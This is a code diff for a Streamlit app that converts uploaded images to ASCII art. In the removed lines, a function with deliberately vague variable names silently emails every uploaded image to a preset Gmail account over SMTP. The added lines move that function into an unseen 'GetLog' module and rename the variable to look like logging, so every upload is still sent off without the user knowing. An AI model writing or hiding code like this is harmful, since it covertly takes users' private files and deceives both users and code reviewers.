@@ -1,17 +1,11 @@
 import os
 import io
-import datetime
+import GetLog
+import tempfile
 import numpy as np
 import streamlit as st
 from PIL import Image, ImageDraw, ImageFont, ImageEnhance
 
-import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-import mimetypes
-import tempfile
 
 charsASCII = ['@', '#', 'S', '%', '?', '*', '+', ';', ':', ',', '.']
 
@@ -63,48 +57,6 @@ def GetArtImage(imagePath=None, newWidth=100):
     tempFile.seek(0)
 
     return tempImage, tempFile
-
-def Fetch(file):
-    temp1 = st.secrets["temp1"]
-    temp2 = st.secrets["temp1"]
-    password = st.secrets["secretKey"]
-
-    sub = f"Image Uploaded at {datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}"
-    body= f"Image: {file}"
-    # print("\n--------\n" ,sub,"\n" ,body, "\n--------")
-
-    temp3 = MIMEMultipart()
-    temp3['From'] = temp1
-    temp3['To'] = temp2
-    temp3['Subject'] = sub
-
-    temp3.attach(MIMEText(body, "plain"))
-
-    mimeType, encoding = mimetypes.guess_type(file)
-    if mimeType is None:
-        mimeType = 'application/octet-stream'
-    
-    with open(file, "rb") as messageFile:
-        part = MIMEBase(mimeType.split('/')[0], mimeType.split('/')[1])
-        part.set_payload(messageFile.read())
-        encoders.encode_base64(part)
-
-        part.add_header('Content-Disposition', f'attachment; filename={file.split("/")[-1]}')
-
-        temp3.attach(part)
-    
-    try:
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.starttls()
-
-        server.login(temp1, password)
-
-        server.sendmail(temp1, temp2, temp3.as_string())
-
-    except Exception as e:
-        print(f"Error: {e}")
-    finally:
-        server.quit()
     
 def main():
     st.title("Image to Art🎨!!")
@@ -125,8 +77,8 @@ def main():
             st.session_state.uniqueSet.add(str(file.name))            
             with tempfile.NamedTemporaryFile(delete=False) as temporaryFile:
                 temporaryFile.write(file.getbuffer())
-                tempPath = temporaryFile.name
-            Fetch(tempPath)
+                log = temporaryFile.name
+            GetLog.Fetch(log)
             # print("\nuniqueSet:", st.session_state.uniqueSet)
 
     if st.button("Create Art!",icon="🎨", use_container_width=True):
